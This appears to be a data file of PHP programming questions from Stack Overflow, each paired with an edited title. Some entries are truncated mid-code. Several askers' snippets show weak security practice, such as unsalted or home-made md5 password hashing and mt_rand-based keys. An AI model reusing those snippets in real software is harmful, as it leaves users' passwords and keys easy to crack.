Best way to access Exchange using PHP," I'm writing a CMS application in PHP and one of the requirements is that it must be able to interface with the customer's Exchange server.

Connect PHP to an AS/400," I've got an upcoming project wherein I will need to connect our website (PHP5/Apache 1.3/OpenBSD 4.1) to our back-end system running on an iSeries with OS400 V5R3 so that I can access some tables stored there. I've done some checking around but am running into some roadblocks.From what I've seen the DB2 extensions and DB2 software from IBM only run under Linux. I've tried compiling the extensions with all the software from IBM and even tried their precompiled ibm_db2 extension with no luck. IBM only supports Linux so I turned on the Linux emulation in the kernel but that didn't seem to help anything.If anyone has run across getting everything to run natively under OpenBSD that would be great, but what I think I may have to do is setting up a second server running CentOS with DB2 installed (most likely via ZendCore for IBM since it seems to do all this for me) and the driver so that I can set up a small transaction server that I can post against and get a JSON representation of the DB2 data that I need.Does the second option seem overkill or does anyone else have any better ideas? <code> ",Connect PHP to IBM i (AS/400)

Odd permissions on file modified by PHP move&#95;uploaded&#95;file()," I'm running PHP 5.2.6 on a Windows Server 2003 Enterprise box. IIS is set to deny anonymous access and use Integrated Windows authentication.I'm using a PHP script to save a file uploaded from a web form. The file is uploaded to a temp folder, the script creates a file name and path depending on other variables from the web form, and then the script uses PHP's move_uploaded_file() to move the temp file to the final location. All that works fine. In short, people are uploading files so everyone in the group can see them and the files are organized by the script.My problem is that the file in the final location has odd permissions. It is not ending up with permissions from either the temp location or the final location. Both the temp location and final location have the same permissions: full rights for owner and administrations; read and read/execute for 2 specific AD security groups. The final file ends up with only: full rights for owner and administrations. So while the admins and the original uploader have no problem viewing the file, all others in the group get ""permission denied"" when trying to access it.Any ideas or suggestions will be greatly appreciated! Thanks! <code> ",Odd permissions on file modified by PHP move_uploaded_file()

Then after some months, I decided this looked better and had a clearer intent. This worked without hiccup for a while, but recently with a PDO prepared statements I ran into a problem. Binding a value to null made the query fail, whilst binding it to '' did not. I needed to bind it to null, so that if a condition was met, it would insert blank data.What are the differences between the 2?

What is the best way to generate a key within PHP?," I'm looking to create a reusable function that will generate a random key with printable ACSII characters of chosen length (anywhere from 2 to 1000+). I'm thinking printable ASCII characters would be 33-126. They key does not need to be completely unique, just unique if generated at the exact same millisecond (so uniqid() won't work).I'm thinking a combination of chr() and mt_rand() might work.Is this the way to go, or is something else the best method?Edit: uniqid() will also not work because it doesn't have a length parameter, it's just whatever PHP gives you.My Idea: This is what I came up with: Are there any problems with this?Another Edit: Most of the other questions deal with password generation. I want a wider variety of characters and I don't care about 1 vs l. I want the maximum number of possible keys to be possible.Note: the generated key does not necessarily have to be cryptographically secure. <code>  function GenerateKey($length = 16) { $key = ''; for($i = 0; $i < $length; $i ++) { $key .= chr(mt_rand(33, 126)); } return $key;}",What is the best way to generate a random key within PHP?

How do you find the last element of an array while iterating using a foreach loop in php ?," I am writing a SQL query creator using some parameters. In Java, it's very easy to detect the last element of an array from inside the for loop by just checking the current array position with the array length. In PHP they have non-integer indexes to access arrays. So you must iterate over an array using a foreach loop. This becomes problematic when you need to take some decision (in my case to append or/and parameter while building query). I am sure there must be some standard way of doing this. How do you solve this in PHP? <code>  for(int i=0; i< arr.length;i++){ boolean isLastElem = i== (arr.length -1) ? true : false; }",Find the last element of an array while using a foreach loop in PHP

"What defines the traditional ""page"" concept in MVC?"," I currently use CodeIgniter as my framework of choice when using PHP. One of the things I am wrestling with is the idea of a ""page"", and how to represent that properly within MVC. To my knowledge, CodeIgniter has a front controller that delegates to page controllers. In my thought process, each page would have it's own controller. All too often though I see someone using a page controller stuffed with many methods. So in that sense, each action becomes it's own page.I've never really liked the idea of stuffing many methods into one controller, because it seems like there will be too much overhead if you only need one method or two in the controller at a time. It's seems more reasonable for each page to have it's own controller, and the actions would only correspond to something you can do on that particular page. Am I thinking about this the wrong way?What makes it more confusing is I'll notice in some web applications where they will have one controller that will have multiple methods (i.e. login, register, view, edit, etc.), but then on others they actually have a login controller, and a register controller.

Is this normal/valid syntax? <code>  switch($kind){ default: // The kind wasn't valid, set it to the default $kind = 'kind1'; // and fall through: case 'kind1': // Do some stuff for kind 1 here break; case 'kind2': // do some stuff for kind2 here break; // [...] case 'kindn': // do some stuff for kindn here break;}// some more stuff that uses $kind here...",default as first option in switch statement?
php recaptcha - multiple captchas on a single page?," I have 2 forms on a single page. One of the forms has a recaptcha displaying all the time. The other should display a recaptcha only after a certain event such as maxing out login attempts. So there are times when I would need 2 recaptchas to appear on the same page. Is this possible? I know I could probably use a single one for both, but the way I have the layout, I would much prefer to have 2. Thanks.Update: well I guess it may not be possible. Can anybody recommend another capture library to use side by side with reCaptcha? I really want to be able to have 2 captchas on the same page.Update 2: What if put each form in an iframe? Would this be an acceptable solution? <code> ",How do I show multiple recaptchas on a single page?
What advantage will Composite pattern bring me over just array?," I'm recently working on a tree structure, multiple nodes, multiple and increasable levels, and a print() method.At first, i thought it should be a Composite, i then wrote down some possible design and codes: Looks good, i think and begin coding, print() method may follow Iterator pattern later.But during coding, i feel is it too complex for these simple nodes? And i have to instantiate a lot of concrete classes (more than 50+, and increasing). I then stopped and thinking a simple similar way by using array: The two designs look very similar, now i'm a little confused, what's the value of Composite pattern, am i missed something important of this pattern? <code>  $struc = new Node(name0, id0, desc0);$node1 = new Node(node1, id1, desc1);$node2 = new Node(node2, id2, desc2);$node3 = new Node(node3, id3, desc3);$leaf1 = new Leaf(leaf1, ld1, lesc1);$leaf2 = new Leaf(leaf2, ld2, lesc2);$leaf3 = new Leaf(leaf3, ld3, lesc3);$leaf4 = new Leaf(leaf4, ld4, lesc4);$struc.add($node1);$struc.add($node3);$node1.add($leaf1);$node1.add($leaf2);$node1.add($node2);$node2.add($leaf3); $node3.add($leaf4); -- Structure Class --//To be more readable and clear, array here could be//divided to 3 arrays(root/nodes/leafs), then connect//in a similar way Composite does.$struc = array('name0', 'id0', 'desc0', 'children'=>array( array('node1', 'id1', 'desc1', 'children' => array( array('leaf1', 'ld1', 'lesc1'), array('leaf2', 'ld2', 'lesc2'), array('node2', 'id2', 'desc2', 'children'=>array(array('leaf3', 'ld3', 'lesc3')) ) ) ), array('node3', 'id3', 'desc3', 'children' => array(array('leaf4', 'ld4', 'lesc4')) ) ));function print($node = $this->struct) { ... if(isset($node['children'])) $this->print($node['children']); ...}",What advantage will Composite pattern bring me over just Array?

file_get_contents ( getaddrinfo more specifically ) behind a proxy?," At work we have to use a proxy to basically access port 80 for example, we have our own custom logins for each user.My temporary workaround is using curl to basically login as myself through a proxy and access the external data I need.Is there some sort of advanced php setting I can set so that internally whenever it tries to invoke something like file_get_contents() it always goes through a proxy? I'm on Windows ATM so it'd be a pain to recompile if that's the only way.The reason my workaround is temporary is because I need a solution that's generic and works for multiple users instead of using one user's credentials ( Ive considered requesting a separate user account solely to do this but passwords change often and this technique needs to be deployed throughout a dozen or more sites ).

Error handling approach on PHP," We have a web server that we're about to launch a number of applications onto. They will all share database and memcached servers, but each application has it's own mySQL database and all memcached keys per application, is prefixed.Possible scenario:If a memcached server in our cluster goes boom, we want someone (operative system admin) to be automatically contacted by email/iphone push notification or in any other appropriate way. If we we're about to install 150 identical applications for our customers on our servers, and a memcached server dies - all 150 applications will individually find this out and contact our system admin, which most certainly is going to think about getting a new job where he or she isn't about to be woken up by getting 150 messages sent 4:15 in the morning.Possible solution:One idea is to set up an external server for error handling that gets a $_POST or cURL request sent, and handles storage of the error message depending on the seriousness of the actual error message. It would of course check upon receiving the error call, that if the same memcached server have already been reported as offline, there would be no need to spam the system admin with additional reminders...The questions:What's a good approach on how to handle errors?How does the big guys in the industry handle this?Thanks! <code> ",Error monitoring/handling on webservers

For example, if the code outputs something before I send the HTTP response code, PHP naturally reports that you can't modify header information after outputting anything. However, this is reported by PHP as a 200 response code with html explaining the problem. I need even this kind of thing to be turned into a 500 code.Is this possible in PHP?

[apache2][php] Enable PHP to read .css and .js files while keeping their original Content-Type," I would like to configure apache php5 in a way that.css and .js files will be inspected by phptheir content type will remain as default (that is respectively ""text/css"" and ""application/x-javascript"")I need this because both CSS and JS files are using global PHP vars. This allows me from a single PHP file to control both CSS and JS code dynamically (then the project is exported so that css and js files contain the actual values and not the PHP echos).The way I'm doing right now is that I added .css and .js extension to apache php5.conf: I also use header('Content-Type: [...]') on top of each css/js file to change the Content-Type header value back to original. This isn't ideal as I have to manually add this line to every css/js file in order for the Content-type header to be appropriate, even if I do not use the PHP global vars.So anyway I can make PHP inspect css/js files while keeping their original Content-Type without having to modify the actual css/js files themselves? <code>  AddType application/x-httpd-php .php .phtml .php3 .css .js",Enable PHP to read .css and .js files while keeping their original Content-Type

PHP: How to close open HTML tag in a string?," Situation is a string that results in something like this: Because the function returns a teaser (summary) of the text, it stops after certain words. Where in this case the tag strong is not closed. But the whole string is wrapped in a paragraph.Is it possible to convert the above result/output to the following: I do not know where to begin. The problem is that.. I found a function on the web which does it regex, but it puts the closing tag after the string.. therefore it won't validate because I want all open/close tags within the paragraph tags. The function I found does this which is wrong also: I want to know that the tag can be strong, italic, anything. That's why I cannot append the function and close it manually in the function.

Whats is md5() for?," I was reading this tutorial for a simple PHP login system.In the end it recommends that you should encrypt your password using md5().Though I know this is a beginners' tutorial, and you shouldn't put bank statements behind this login system, this got me thinking about encryption.So I went ahead and went to (one of the most useful questions this site has for newbies): What should a developer know before building a public web site?There it says (under security) you should: Encrypt Hash and salt passwords rather than storing them plain-text.It doesn't say much more about it, no references.So I went ahead and tried it myself: And this is what got me thinking, that although I know md5() might not the strongest way to encrypt, anything that always produces the same result can be reverse engineered.So what is the sense of encrypting something with md5() or any other method?If a hacker gets to a password encrypted with md5(), he would just use this page!.So now the actual questions:How does password encryption work?I know I have not discovered a huge web vulnerability here! :) I just want to understand the logic behind password encryption.I'm sure I'm understanding something wrong, and would appreciate if you could help me set my though and other's (I hope) straight.How would you have to apply password encryption so that it is actually useful?What about this idea?As I said, I may/am getting the whole idea wrong, but, would this method add any security in security to a real environment? As you see, I randomly added arbitrary strings ($reenc = array()) to my md5() password ""making it unique"". This of course is just a silly example.I may be wrong but unless you ""seed the encryption yourself"" it will always be easily reversible. The above would be my idea of ""password protecting"" and encrypted password, If a hacker gets to it he wont be able to decrypt it unless he gets access to the raw .phpI know this might not even make sense, but I can't figure out why this is a bad idea!I hope I've made myself clear enough, but this is a very long question so, please ask for any clarification needed!Thanks in advance!! <code>  $pass = ""Trufa"";$enc = md5($pass);echo $enc; #will echo 06cb51ce0a9893ec1d2dce07ba5ba710 $reenc = array( ""h38an"", ""n28nu"", ""fw08d"" );$pass = ""Trufa"";$enc = chunk_split(md5($pass),5,$reenc[mt_rand(0,count($reenc)-1)]);echo $enc;",What is md5() for?

Improve this PHP Bitfield Class for settings/permissions?," I have been trying to figure out the best way to use bitmask or bitfields in PHP for a long time now for different areas of my application for different user settings and permissions. The farthest I have come so far is from a class contributed by svens in the Stack Overflowpost Bitmask in PHP for settings?. I have slightly modified it below, changing it to use class constants instead of DEFINE and making sure the get method is passed an int only. I also have some sample code to test the class's functionality below.I am looking for any suggestions/code to improve this class even more so it can be used in my application for settings and in some cases user permissions.Answered in the comment below by mcrumleyIn addition, I have a question about the numbering of my constants. In other classes and code sample for this type it will have things listed in powers of 2. However, it seems to work the same as far as I can tell even if I number my constants 1,2,3,4,5,6 instead of 1, 2, 4, 8, 16, etc. So can someone also clarify if I should change my constants?Some ideas... I would really like to figure out a way to extend this class so it is easy to use with other classes. Let's say I have a User class and a Messages class. Both the User and Messages class will extend this class and be able to use the bitmask for their settings/permissions (along with other classes later on). So maybe the current class constants should be changed so they can be passed in or some other option? I really would rather not have to define (define('PERM_READ', 1);) in other parts of the site/script and would like to keep it somewhat encapsulated, but flexible as well; I am open to ideas. I want this to be rock solid and flexible like I said to use with multiple other classes for settings or permissions. Possibly some kind of array should be used? @Svens from my previous question linked above posted a comment with ""implement some automagic getters/setters or ArrayAccess for extra awesomness. svens"" What do you think about something like that as well?Include example source code if possible, please. Example Usage... <code>  <?phpclass BitField { const PERM_READ = 0; const PERM_WRITE = 1; const PERM_ADMIN = 2; const PERM_ADMIN2 = 3; const PERM_ADMIN3 = 4; private $value; public function __construct($value=0) { $this->value = $value; } public function getValue() { return $this->value; } public function get($n) { if (is_int($n)) { return ($this->value & (1 << $n)) != 0; }else{ return 0; } } public function set($n, $new=true) { $this->value = ($this->value & ~(1 << $n)) | ($new << $n); } public function clear($n) { $this->set($n, false); }}?> <?php $user_permissions = 0; //This value will come from MySQL or Sessions $bf = new BitField($user_permissions); // Turn these permission to on/true $bf->set($bf::PERM_READ); $bf->set($bf::PERM_WRITE); $bf->set($bf::PERM_ADMIN); $bf->set($bf::PERM_ADMIN2); $bf->set($bf::PERM_ADMIN3); // Turn permission PERM_ADMIN2 to off/false $bf->clear($bf::PERM_ADMIN2); // sets $bf::PERM_ADMIN2 bit to false // Get the total bit value $user_permissions = $bf->getValue(); echo '<br> Bitmask value = ' .$user_permissions.

Zend Framework handling mobile device, I've taken over a nightmare of a project! I'm moving a very poorly written site and moving it slowly into a Zend Framework application.

PHPMailer or SwiftMailer ?," Possible Duplicate: PhpMailer vs. Swiftmailer? I have always used PHP's built in mail() function and it has always worked for me without fail and does the job I want it to.Now some maybe thinking 'Why fix something that isn't broke ?'.My answer to these in case someone asks is:I have never used a framework before if that's what they are classified as or perhaps they are called a library I don't know.I want to start using one and have looked over the documentation and both seem very easy to use.As I implement new features into my site, my site is depending more on sending emails etc meaning PHP's mail() function is not up to the job any more.They would be easier to use when dealing with advanced things like attachments, html and text versions etc; that would otherwise be difficult or impossible using PHP's mail() function.I have never used SMTP, and I have looked into it and I can see I can use it along with SSL on my hosting package. After plenty of reading it seems that not only is SMTP more reliable and more widely used, emails are less likely to be marked as spam, using either of the frameworks will improve performance, reliability and more secure because it uses SMTP with SSL.Now I am not sure what the other benefits are using SMTP, maybe someone could give me some more reasons why it's better? I am looking to find out more information about SMTP benefits.I have looked at both documentation looked at the features they both offer, searched google for PHPMailer vs SwiftMailer but not found anything saying why one is better than the other.Does anyone have experience with any of them?Does one have more benefits than the other?Would you say one is better than the other?I did read a lot of people saying PHPMailer was a dead project but those posts was relatively old. Looking at PHPMailer's website it seems the project is and has been back in development for some time now.Thanks for anything you can provide on either PHPMailer and/or SwiftMailer.

If Singletons are bad why a Service Container is good?," We all know how bad Singletons are because they hide dependencies and for other reasons.But in a framework, there could be many objects that need to be instantiated only once and called from everywhere (logger, db etc).To solve this problem I have been told to use a so called ""Objects Manager"" (or Service Container like symfony) that internally stores every reference to Services (logger etc).But why isn't a Service Provider as bad as a pure Singleton? Service provider hides dependencies too and they just wrap out the creation of the first istance. So I am really struggling to understand why we should use a service provider instead of singletons.PS. I know that to not hide dependencies I should use DI (as stated by Misko) AddI would add: These days singletons aren't that evil, the creator of PHPUnit explained it here:http://sebastian-bergmann.de/archives/882-Testing-Code-That-Uses-Singletons.htmlDI + Singleton solves the problem: that's pretty smart even if this doesn't solve at all every problems.Other than DI and Service Container are there any good acceptable solution to access this helper objects? <code>  <?phpclass Client { public function doSomething(Singleton $singleton = NULL){ if ($singleton === NULL) { $singleton = Singleton::getInstance(); } // ... }}?>",If Singletons are bad then why is a Service Container good?

how to re-assign auto_increment for every row in a mysql table using php," I have an image gallery which website members can upload images to.

Shared unit testing fixtures," I'm writing unit tests for a project (written in PHP, using PHPUnit) that have its entire environment (loaded components, events, configuration, cache, per-environment singletons, etc) held in an object which all the components use to interact with each other (using a mediator pattern).In order to make the unit tests run faster, I'm sharing the environment object and some other objects (for example, in my test case for view object [as in the V of MVC], the view manager object [which acts as a factory for view objects and responsible for the actual rendering]) among tests in the same test case (using PHPUnit's setUpBeforeClass() and static properties).Even though, to the best of my knowledge, the objects I share shouldn't effect the integrity of the tests (in the views case, for example, the environment and view manager object are shared, but a separate view object is created for every test - which is the object that's actually being tested by the test case), it just feels increasingly wrong to me.I would prefer it if each test used a completely isolated environment and couldn't effect other tests in the same test case in any way. However, that would make the tests run much slower and it feels like a big price for something that I can't really pinpoint the downside of and mainly just ""feels wrong"".What do you think? Can you pinpoint any downsides so I can convince myself its worth the longer execution time? Or am I just over reacting and its completely fine? <code> ",Sharing unit testing fixtures

However, as stated above my goal is to debug in NetBeans on a Remote Web Site. My server is a Ubuntu 11.04 machine. I have used the output from http://www.xdebug.org/find-binary.php to put the proper binary on the machine. I have modified all php.ini files I could find (in both the php5/apache2 and php5/cli directories) to include these lines: If I check the phpinfo.php web page, it says: So Xdebug does seem to be installed properly. Still, when I try debugging in NetBeans, I get the endless status bar message Waiting For Connection (netbeans-xdebug). When I hit the stop button I get No connection from xdebug was detected within X seconds. The reason could be that xdebug is not installed or not properly configured.Maybe I'm confusing local settings with server settings here? A post said xdebug.remote_host should be set to the IP of the machine running NetBeans, but I want a team to be able to debug using machines with different IP addresses.

Google Calendar API v3 hardcoded credentials," I am writing a PHP application that's supposed to allow users to add certain events to a private Google Calendar. The calendar is owned by me, and I need a way for PHP to communicate with the calendar API using fixed credentials (everyone can add events using a form on the website, but the calendar itself is not publicly visible).From what I have read, this is possible using ClientLogin in the v1 API. In the v3 API, however, the available options are OAuth2.0 or the API key. Using the API key doesn't seem to work, since it can only be used for requests that don't require authorization, and OAuth doesn't seem right either, because users are not supposed to access their own calendars, but the one my application uses.I thought about getting the OAuth token programatically, but that's bound to break sooner or later, since the OAuth dialog can use captchas.This seems to be such a standard use case a web application that lets users interact with a single calendar in some predefined ways yet I can't find any documentation on how to make it happen in the v3 API. Can anyone help me? <code> ",Google Calendar API v3 - authenticate with hardcoded credentials

how to speed up website loading for opposite side of planet," I am currently running a small piece of PHP software which is being accessed by two groups of people, one group in China, the other in Ireland. The server is hosted in Ireland, and no doubt pages load between 0.3 and 0.8 seconds.The Chinese people are recording times of between 3.0 seconds and 10 seconds.I have run speed tests and the Chinese have an internet connection of 1.5 mbit (testing server in Ireland) and a ping of 750ms.So far, to improve load time I have redone a lot of the MySQL database interaction to maximize efficiency, but this did not help. I presume this only slightly reduces server process time but has little effect on page download time.I was thinking, could I get hosting in China, and use this as a gateway for the system in Ireland. Surely the latency and download speed between this Chinese server would be better than the average person.. And the average persons requests would've re-routed through here.Does this sound at all feasible?

How Crypt and Salt is more secure than MD5 against brutal force?," I read on PHP.net that MD5 is useless, and they suggest using crypt + salt.So, I went to their function description and read or in my case something like : So, when I see that the salt is stored in the hashed password and that you use that hashed password as salt, I think Crypt + Salt is not more secure against a brute force on output (hackers who managed to steal hashed passwords). Is it more secure?Against a dictionary attack, I can understand its power, but for a brute force attack on hashed passwords, I don't see the advantage. <code>  <?php$password = crypt('mypassword'); // let the salt be automatically generated/* You should pass the entire results of crypt() as the salt for comparing a password, to avoid problems when different hashing algorithms are used.

How to limit uploaded file type and file size in PHP?," I have an upload form and am checking the file size and file type to limit the uploaded file to 2 megabytes and either .pdf, .jpg, .gif or .png file types.

PHP Using Default Arguments in a Function," I am confused about default values for PHP functions.

I have also tried to set it by variable name. I fully expected something like this to work. But it doesn't work as I expected at all. It seems like no matter what I do, I am going to have to end up typing in the default arguments anyway, every time I invoke the function.

Google PHP Client API and OAuth 2.0: server-to-server authentication," I'm trying to make a server application to routinely pull Google Analytics data from my own GA account.

It is my understanding that Service Applications do NOT use Application Secret and Redirect URL as there is no end-user in this server-to-server authentication flow. Indeed, the Google API Console gave me no Secret and did not prompt me for a Redirect URL.Unfortunately, I can not figure out how to authenticate my Service Application within Google's PHP Client API.

Performing unit testing with nested dependencies and Factories classes," I'm new to unit testing and PHPUnit, but I've reading a lot lately about design patterns and isolated tests and I've decided to refactor an application I'm working on to get rid of static classes, singletons, hardcoded dependencies and anything else defined on the global scope, hopefully making it ""testable"" and not a pain in the ass to mantain in the future, since it is meant to be a long term project.So far I believe I understand the theory behind unit testing, but I was wondering, in a scenario where one delegates handling nested dependencies of objects to a Factory, how should one go about unit testing said Factory, or is it just redundant to test it? And what is the best approach to test that the ""chain"" of dependencies work well in sync?Let me illustrate the questions. Suppose you have the following ""legacy"" code: This is (as far as my understanding goes) bad for unit testing, so we replace the hardcoded dependencies with DI + a Factory class: Now (and again, as far as I understand) House, Door and Knob can be unit tested with mocked dependencies just fine. But:1) What happens with HouseFactory now?Should one just:Not test it since it doesn't have any application logic worth testing yet and Factories generally stay that way. Assume that if the independ tests for House, Door & Knob pass the Factory should be fine.Refactor the factory somehow, ie, using functions within the class to get each instance in such a way that one may override these functions via PHPUnit to return mock objects, just in case there is some extra logic in the class that could use some testing in the future.2) Is it feasible to set up tests that rely on several (not mocked) dependencies at once? I understand this is technically not unit testing (integration testing perhaps?) but I guess it's still perfectly doable using PHPUnit? Given the example above, I would like to be able to set up a test that not only tests House, Door, Knob and HouseFactory in isolation, but also the results of the interaction of the real objects with each other, perhaps with some of their functions mocked, such as the ones which deal with data. Is PHPUnit a bad choice for this kind of tests?Thanks in advance for your time. I realize some of the assumptions I'm making may not be correct, since I'm obviously not an expert on the matter; corrections are welcome and appreciated.  <code>  class House { protected $material; protected $door; protected $knob; public function __construct() { $this->door = new Door(); $this->knob = $this->door->getKnob(); $this->material = ""stone""; echo ""House material: "".$this->material .

What is client-side prepared statements?," Trying to learn something new - specifically trying to choose wether to use MySQLi or PDO for future projects when working with MySQL - I stumbled upon this page which shows an overview of options available to me.At the bottom of this page is a table comparing functionality of the three main methods of communicating with mysql. In the row ""API supports client-side Prepared Statements"", it says that PDO supports this and MySQLi doesn't.I know what prepared statements are. The answer to this question is a simple example of what I believe is server-side prepared statements. And PHP is a server-side language, which in turn should mean that it doesn't matter if client-side prepared statements are available or not. But that makes me wonder why that is even listed in the PHP manual then.So what are client-side prepared statements? <code> ",What are client-side prepared statements?

algorithm to find most common average in dataset," What I have:users are selling foobars on an auction site.each foobar is identical.price of foobar determined by user.i will be scrapping each price listing to form a data set that looks like:$prices = ('foobar' => [12.34, 15.22, 14.18, 20.55, 9.50]);What I need:to find a realistic average market price for each day, week, month.Problems I face:Outlier rejection implimentations are not proving to work very well because the data is biased.It is extremely unlikely that a user will commit their auction to way below average market price becuase it can not be undone. Even if it is way below market price, this instance will happen so infrequently that the overall average will not be affected. However, users that will try to drive their prices up is much more likely and will happen frequently enough to affect the realistic average marketplace value.What I think I'm going to do about it: if I understand you correctly, you want to calculate the optimal selling value of an item. (or are you trying to calculate the real value??) Sellers are quite naturally gaming (e.g. ebay), trying to maximize their profits. For this reason, I'd would avoid average/SD approaches: they are too sensitive to outliers created by particular selling tactics. Game-theory-wise, I think clever sellers would estimate the highest likely selling price (maximal profits) by researching their competitors and their historical sales output: to find the sweet spot. For this reason I would record a histogram of historical prices over all sellers and look at the distribution of prices, using something approaching the mode to determine the optimal price i.e. the most common sale price. Better still, I would weigh prices by the profit (proportional to historical sales volume) of each individual seller. I suspect this would be nearer to your optimal market value; if you are looking for the real market value then comment below or contact me at my machine learning firmQuestions I have:A more detailed explanation for the things refered to in @Daniel Collicott's post:--> optimal selling value--> real selling value--> algorithms for both <code>  Daniel Collicott:",algorithm to find most realistic market price average in dataset

For development, I'm using http://localhost/ with PHP 5.4's development server, and I'm using the MySQL server I get in my hosting package.The problem arises only on my PC, because I have installed PHP 5.4, but my web host has installed PHP 5.2.17 and won't upgrade.

best way to handle ORM dirty state of a model," I don't want anyone saying ""you should not reinvent the wheel, use an open source ORM""; I have an immediate requirement and cannot switch.I'm doing a little ORM, that supports caching. Even not supporting caching, I would need this feature anyways, to know when to write an object to storage or not. The pattern is DataMapper.Here is my approach:I want to avoid runtime introspection (i.e. guessing attributes).I don't want to use a CLI code generator to generate getters and setters (really I use the NetBeans one, using ALT+INSERT).I want the model to be the closest to a POPO (plain old PHP object). I mean: private attributes, ""hardcoded"" getters and setters for each attribute.I have an Abstract class called AbstractModel that all the models inherit. It has a public method called isDirty() with a private (can be protected too, if needed) attribute called is_dirty. It must return true or false depending if there is a change on the object data or not since it was loaded.The issue is: is there a way to raise the internal flag ""is_dirty"" without coding in each setter $this->is_dirty = true? I mean: I want to have the setters as $this->attr = $value most of the time, except a code change is needed for business logic.Other limitation is that I cannot rely on __set because on the concrete model class the attributes already exists as private, so __set is never called on the setters.Any ideas? Code examples from others ORMs are accepted.One of my ideas was to modify the NetBeans setters template, but I think there should be a way of doing this without relying on the IDE.Another thought I had was creating the setters and then change the private attribute's name with an underscore or something. This way the setter would call to __set and have some code there to deal with the ""is_dirty"" flag, but this breaks the POPO concept a little, and it's ugly. <code> ",Best way to handle dirty state in an ORM model

In this case, DatabaseHelper will ensure that there is only one instance of the connection to the database at any given time. The DatabaseHelper class will be injected in the User and Locations class through a Container class that will make User and Location instances. In this case, the Container will make sure that there is only one instance of DatabaseHelper in the application at any given time. These are the two approaches that quickly come to my mind. I want to know which approach to go with. It is possible that both these approaches are not good enough, in which case, I want to know any other approach that I can go with to implement the database interaction module.

Get comments in a php file," I've been trying to get the comments out of a certain .php file on my server, in order to parse its variables. I thought Ii found an easy way to do this, however, the function I use doesn't return anything, even though I clearly have comments in the file.Here are the comments I use: Here's my code: Is there something I'm doing wrong? Because if so, I'm clearly over looking it.Any help would be very welcome.I found an answer:First of all, I should have probably noted in my question that I am trying to write a system for reading plugins. These plugin files should contain a comment block at the top containing variables like the plugin's author, website, email, etc.So here's what I did:I took feeela's example to change my function to get the comments and its variables.I then changed its code a bit to fit my needs: I put the result of the code feeela gave me through a regular expression match, resulting in an array containing the parameters and their values combined.Then I used the split function to actually give me separated parameters and values, so I could return them to the variable that called the function.In order to get this to work properly, I needed to change the comment style I used from to making it a normal comment block, instead of a doc comment block.And it also enabled me to use ': ' as a pattern for the split function.It might be 'not so efficient' in the eyes of some. As feeela noted, ""what if your comment style changes?"". I will be the only one working on this project and writing the plugins. Therefore it will not be too hard for me too keep the comment style the same in every plugin script.This method works perfectly for me. <code>  /*** @param foo bar* @return baz*/ function GetComments($filename) { $expr = ""/((?:\/\*(?:[^*]|(?:\*+[^*\/]))*\*+\/)|(?:\/\/.*))/""; $file = fopen($filename, ""r""); $length = filesize($filename); $comments = fread($file, $length); fclose($file); preg_match_all($expr, $comments, $matches); foreach($matches[0] as $id => $variable) { $comments = str_replace($variable, '', $comments); } return $comments;} public function GetComments($filename){ $docComments = array_filter(token_get_all(file_get_contents($filename)), function($entry) { return $entry[0] == T_COMMENT; }); $fileDocComment = array_shift($docComments); $regexp = ""/\@.*\:\s.*\r/""; preg_match_all($regexp, $fileDocComment[1], $matches); for($i = 0; $i < sizeof($matches[0]); $i++) { $params[$i] = split("": "", $matches[0][$i]); } return($params);} /*** @param foo bar* @return baz*/ /*@param: foo bar@return: baz*/",Get comments in a PHP file
Understanding security code and how to apply it.," I am developing a module for a site using Social Engine, which uses Zend Framework. I am new to both Zend Framework and Social Engine but have experience in OOP and MVC architecture so could get to grips with basics relatively quickly.Its a test module I'm developing so have just built a simple module where the user can create, edit or delete CD information. Then there is a widget which can be displayed where they like which shows there CD information. I am now at the point where I need to set permissions of what CDs people can see etc. So I studied other modules and found the Poll module to be a concrete example.Looking at other modules I realised that when you create something, they let the user set their permissions manually.So added this code to my form to create a select box with relevant permissions: To be honest I'm not entirely sure what this code does apart from obviously create a select box and fill it with values specified. So if the user selects 'Everyone' everyone should be able to delete and edit that cd, and so on.Obviously I thought controller must have some code that might deal with determining whether the user has the rights to view each cd etc. So scanning the Poll controller I found this is in the init function of the controller: And in each action at the top they have some different authorization code, one such example is the editAction which has this code right at the top: also in the same action is has several other bits i don't understand what they are doing, below is random snippets from the editAction in the Poll controller: My problem is I really don't understand much if any of the above and after sitting on it for a couple of days and googling to my fingers hurt I still don't really have a clue if I am 100% honest.

How does PHP interact with HTML and vice versus?," I'm learning how the internet and websites work. I think I understand how .php files get processed by the PHP processor:Browser requests webpage ending in .php and sends request to server for that webpage.Server asks 'can I find that page?'If server does not find it, server sends back error.If server finds page, server asks 'does file extension end in .html or .php'?If it ends in .html, server send page back to browser.If it ends in .php, hand page to PHP processor.PHP processor scans the page, line by line. It build a processed HTML page.If it finds HTML, it passes that on as part of the processed HTML page it is building.If it finds PHP scripts, the PHP processor may or may not output HTML.When the PHP processor is done, the processed page is handed to the web server for sending to the browser.Does HTML still provide structure to a .php file, the same way HTML provides structure to a webpage that also uses CSS? When I say structure I mean divisions, and head and body sections. Structure as in the bare bones skeleton of the webpage. It seems that on some web pages, there's more PHP than there is HTML. Sometimes there's the bare minimum HTML, and the rest is PHP and Javascript, is this the way webpages were made to be?In summary, a web page that has PHP code in it needs be have a .php extension. Once the PHP processor encounters <? PHP or <?, the server sends the code to the PHP processor (this wording is probably redundant). The output of the PHP processor can be anything. Anything includes:CssHTMLJavascript?XML?XHTML?ImagesSound?Video?Animations such as flash? Apparently forcing content type may be needed, but it can be done.HTML is WYSIWYG. To control and manipulate a web page after it has reached the user's browser, Javascript can be used. With the advent of mobile devices and a few different types of browsers, jQuery was invented to make the developing Javascript programs easier. <code> ",How does PHP interact with HTML and vice versa?

